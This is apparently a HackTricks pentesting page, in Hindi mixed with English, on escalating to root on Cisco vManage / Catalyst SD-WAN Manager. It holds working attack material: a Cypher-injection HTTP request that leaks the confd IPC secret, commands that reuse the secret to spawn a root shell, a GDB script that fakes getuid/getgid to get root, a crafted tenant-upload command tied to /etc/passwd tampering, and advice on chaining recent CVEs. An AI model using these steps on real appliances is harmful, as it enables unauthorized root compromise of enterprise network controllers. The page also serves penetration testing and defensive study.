# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

एक बार जब आपके पास Cisco vManage / *Catalyst SD-WAN Manager* पर `vmanage`, `netadmin`, या `vmanage-admin` के रूप में code execution हो जाता है, तो सबसे दिलचस्प local privesc surfaces आमतौर पर `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs, और root-owned import/upload handlers होते हैं।

यदि आपको अभी भी किसी controller पर **initial foothold** चाहिए, तो पहले dedicated control-plane page देखें:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
यदि `/etc/confd/confd_ipc_secret` आपकी foothold से readable है, तो Path 1 और Path 2 तुरंत practical हो जाते हैं। यदि आप किसी remote info leak या webshell के जरिए आए हैं, तो यह भी जांचें कि क्या आप पहले से `vmanage-admin` SSH material या multitenancy upload handlers तक पहुंच सकते हैं: 2026 research ने दिखाया कि दोनों realistic stepping stones थे।

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

`confd` और अलग-अलग binaries (जो Cisco website पर account के साथ accessible हैं) से संबंधित कुछ [documentation](http://66.218.245.39/doc/html/rn03re18.html) में थोड़ा dig करने के बाद, हमें पता चला कि IPC socket को authenticate करने के लिए यह `/etc/confd/confd_ipc_secret` में स्थित एक secret का उपयोग करता है:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
याद है हमारी Neo4j instance? यह `vmanage` user के privileges के तहत चल रही है, इसलिए हम previous vulnerability का उपयोग करके file retrieve कर सकते हैं:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` प्रोग्राम command line arguments को support नहीं करता, लेकिन arguments के साथ `/usr/bin/confd_cli_user` को call करता है। इसलिए, हम सीधे `/usr/bin/confd_cli_user` को अपने खुद के arguments के set के साथ call कर सकते हैं। हालांकि, यह हमारे current privileges के साथ readable नहीं है, इसलिए हमें इसे rootfs से retrieve करना होगा और scp का उपयोग करके copy करना होगा, help पढ़ना होगा, और इसका उपयोग shell पाने के लिए करना होगा:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv team का blog¹ ने root shell पाने का एक elegant तरीका बताया, लेकिन caveat यह है कि इसमें `/usr/bin/confd_cli_user` की एक copy हासिल करनी पड़ती है, जो केवल root द्वारा readable है। मुझे root तक escalate करने का एक और तरीका मिला, बिना इतनी hassle के।

जब मैंने `/usr/bin/confd_cli` binary को disassemble किया, तो मैंने निम्नलिखित देखा:

<details>
<summary>UID/GID collection दिखाता Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

जब मैंने “ps aux” चलाया, तो मैंने निम्नलिखित देखा (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
मैंने अनुमान लगाया कि “confd_cli” प्रोग्राम लॉग-इन किए गए user से एकत्र किए गए user ID और group ID को “cmdptywrapper” application को पास करता है।

मेरा पहला प्रयास “cmdptywrapper” को सीधे चलाने और उसे `-g 0 -u 0` देने का था, लेकिन यह असफल रहा। ऐसा लगता है कि कहीं रास्ते में एक file descriptor (-i 1015) बनाया गया था और मैं उसे fake नहीं कर सकता।

जैसा कि synacktiv’s blog(last example) में बताया गया है, “confd_cli” प्रोग्राम command line argument support नहीं करता, लेकिन मैं debugger के साथ इसे influence कर सकता हूँ और सौभाग्य से सिस्टम पर GDB शामिल है।

मैंने एक GDB script बनाई जिसमें मैंने API `getuid` और `getgid` को 0 return करने के लिए मजबूर किया। चूँकि deserialization RCE के माध्यम से मेरे पास पहले से ही “vmanage” privilege है, इसलिए मुझे `/etc/confd/confd_ipc_secret` को सीधे पढ़ने की permission है।

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Output:

<details>
<summary>Console output</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco ने बाद में अपने ही advisory में [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) के लिए एक cleaner local root path documented किया: केवल **read-only privileges** वाला एक **authenticated attacker** manager CLI को एक crafted request भेज सकता था और insufficient input validation की वजह से root तक jump कर सकता था।

Offensive perspective से, यह महत्वपूर्ण takeaway है:

1. एक बार जब आपके पास box पर *कोई भी* low-priv foothold हो, तो भारी Path 1 / Path 2 workflow पर जाने से पहले local CLI service को test करना चाहिए।
2. Path 2 के artifacts को reuse करके trust boundary ढूंढें: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend को forward किए गए हर field को suspicious मानें: UID/GID, username, terminal metadata, imported files, या कोई भी value जो बाद में root-owned helper द्वारा consumed हो।
4. अगर कोई low-priv user local CLI socket तक पहुंच सकता है और उन fields को influence कर सकता है, तो root सिर्फ एक crafted request दूर हो सकता है।

Appliance पर landing के बाद एक practical workflow है:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
यह 2025 बग को समान versions के लिए एक अच्छा hunting pattern बना देता है: **ऐसे local CLI shims खोजें जो userland में identity collect करें और उसे अधिक privileged wrapper को forward करें**।

**CVE-2025-20122** को बाद वाले **CVE-2026-20122** से confuse न करें: 2025 issue एक *local* CLI-to-root bug है, जबकि 2026 issue एक *remote* API arbitrary file overwrite है, जो मुख्यतः foothold plant करने और फिर Path 1 / Path 2 / Path 4 पर वापस जाने के लिए उपयोगी है।

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco की February 2026 advisory ने एक और useful privesc class भी introduce की: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) ने एक **authenticated, local attacker with low privileges** को root पाने दिया क्योंकि REST API में insufficient user-authentication mechanism था।

यह matter करता है क्योंकि vManage privesc अब सिर्फ `confd`/TTY abuse तक सीमित नहीं है। low-priv shell के बाद, यह भी hunt करें:

- localhost-only API endpoints जो caller पर बहुत ज़्यादा trust करते हैं
- tokens, cookies, या service credentials जो current account से readable हों
- root-only actions जो `dataservice`/REST handlers के through exposed हों और फिर भी locally trigger किए जा सकें

Practical तौर पर, जब आपके पास `vmanage` या किसी और service user के रूप में shell हो, तो local API abuse अक्सर interactive CLI abuse की तुलना में quieter और automate करने में आसान होती है:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
यदि local session context privileged REST functionality तक पहुँचने के लिए पर्याप्त है, तो API path को प्राथमिकता दें: इसे replay करना, script करना, और stolen web sessions या API tokens के साथ chain करना आसान होता है।

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

एक और हालिया pattern है [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): `netadmin` privileges वाला एक local attacker एक **crafted file** upload कर सकता था, जिसे बाद में CLI ने unsafe तरीके से handle किया, जिससे `root` के रूप में command injection हो गई।

एक HackTricks point of view से, valuable technique specific CVE से कहीं broader है:

1. हर CLI या web workflow को enumerate करें जो file accept करता है: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Trace करें कि uploaded file कहाँ जाती है और कौन-सा root-owned script या binary उसे consume करता है।
3. Test करें कि filename, file content, या parsed metadata कभी shell commands, wrapper scripts, या `system()`-style helpers को pass किया जाता है या नहीं।
4. यदि आप पहले से `netadmin` तक पहुँच सकते हैं (valid creds, stolen session, या auth-bypass chain), तो file-processing bugs अक्सर root तक पहुँचने का सबसे तेज़ path होते हैं।

बाद में Google Cloud / Mandiant ने दिखाया कि इस bug class का एक बहुत concrete instance multitenancy import path के माध्यम से exploit किया गया था:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
देखे गए attack में, crafted CSV ने अंततः `/etc/passwd` और `/etc/shadow` को modify किया ताकि एक temporary UID 0 account (`troot`) create हो सके। इससे `tenant-upload` / `tenant-list` style importers खास तौर पर interesting बन जाते हैं: ये सिर्फ data-ingestion features नहीं हैं, बल्कि potential root-owned parser front-ends भी हैं।

एक quick shell-side hunting pattern है:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
यह bug class विशेष रूप से उन remote footholds के साथ अच्छी तरह chain होती है जो `netadmin` देते हैं लेकिन `root` नहीं।

## Chain करने के लिए अन्य recent vManage/Catalyst SD-WAN Manager vulns

- **Unauthenticated info leak (CVE-2026-20133)** – खासकर high-value क्योंकि public research ने दिखाया कि यह `confd_ipc_secret` या `vmanage-admin` private key expose कर सकता है, जिससे एक read bug या तो Path 1 या NETCONF pivot में बदल जाता है।
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – ऊपर वाले 2025 CLI bug से अलग; VulnCheck ने इसका उपयोग webshell upload करने के लिए किया, जिससे इस page पर local privesc paths तुरंत relevant हो जाते हैं।
- **Authenticated UI XSS (CVE-2024-20475)** – web UI में admin session steal करें, फिर API/CLI actions में pivot करें जो अंततः `vshell` या ऊपर दिए गए local privesc paths तक पहुँचें।
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Path 5 के लिए बहुत strong precursor, क्योंकि `netadmin` वही level है जो 2026 crafted-file privesc के लिए required है।
- **Authenticated arbitrary file write (CVE-2026-20262)** – CVE-2026-20122 के समान offensive value, लेकिन बाद वाले web UI upload path के जरिए: ऐसी location में write करें जिसे बाद में root या management-plane web tier parse करेगा।
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusions ने दिखाया कि attackers पुराने vulnerable SD-WAN build पर roll back कर सकते हैं, old CLI root bug abuse कर सकते हैं, और फिर original version restore कर सकते हैं।
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – dedicated SD-WAN control-plane page में बेहतर documented; यह `vmanage-admin` के लिए SSH key append कर सकता है, जिससे आपको इस page को revisit करने के लिए local foothold मिल जाता है।



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
